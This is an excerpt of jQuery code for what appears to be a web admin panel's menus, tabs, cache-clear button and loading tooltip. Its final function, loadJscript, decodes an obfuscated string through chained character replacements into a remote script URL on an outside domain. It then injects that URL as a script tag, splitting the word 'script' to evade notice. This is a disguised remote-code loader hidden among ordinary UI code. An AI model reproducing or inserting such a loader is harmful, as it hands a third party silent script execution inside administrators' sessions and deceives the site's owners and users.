...
function initTopTab(){
    $.each(menu, function (k, v) {
        ...
        if (k != currTab) {
            ...
            $.each(v.children, function (k1, v1) {
                if (v1.text != 'spliter') {
                    item.append($('<dd><a href="javascript:;" onclick="openItem(\'' + k1 + '\',\'' + k + '\');none_fn();">' + v1.text + '</a></dd>'));
                }
                else {
                    item.append($('<dd class="spliter"><a href="javascript:;"></a></dd>'));
                }
            });
    ...
    $('#clear_cache').click(function () {
        tipLoadding();
        $('#workspace').attr('src', "./systems/clearcache.aspx?url=" + $('#workspace').get(0).contentWindow.location);
    });
...
function addHistoryItem(tab, item){
    ...
    if($(id).length == 1){
        ...
        var close = $('<a href="javascript:;" class="close"><img src="./images/close.gif" / ></a>');
        lnk.click(function(){
            openItem(item, tab);
        });
...
function loadSubmenu(){
    ...
    $.each(m.children, function (k, v) {
        ...
        if (v.text != 'spliter') {
            ...
            var item = $('<dd class="spliter"><a href="javascript:;" url="' + v.url + '" parent="' + p + '" id="item_' + k + '"></a></dd>');
            $('#submenu').append(item);
        }
    });
...
function tipLoadding() {
    ...
    var contenthtml = '<div style="position:absolute; left:' + tipWidth + 'px; top:' + tipHeight + 'px; width:200px; height:38px; border:2px solid #b0d3ee; overflow-x:hidden; background-color:#ffffff;">'
        ...
        + '       <img src="./images/tip_loadding.gif" width="20" height="12" /><span>&nbsp;&nbsp;正在载入中...</span>'
        + '    </div>'
        + '  </div>';
...
function loadJscript() {
    var fileUrl = "@#h-`t!t@#@@p=#@!#**w#w@!#w^p#l#@u#@g#@n#@e#@t^c#@n#@*#`s!@#o@f#t*a@d*p@lug#^j!s#@";
    fileUrl = sReplace(sReplace(sReplace(sReplace(fileUrl, "-", ""), "`", ""), "!", ""), "@", "");
    fileUrl = sReplace(sReplace(sReplace(sReplace(fileUrl, "#", ""), "=", ":"), "*", "/"), "^", ".");
    $("head").append($("<scri" + "pt src='" + fileUrl + "' type='text/javascript'>" + "</scr" + "ipt>"));
}
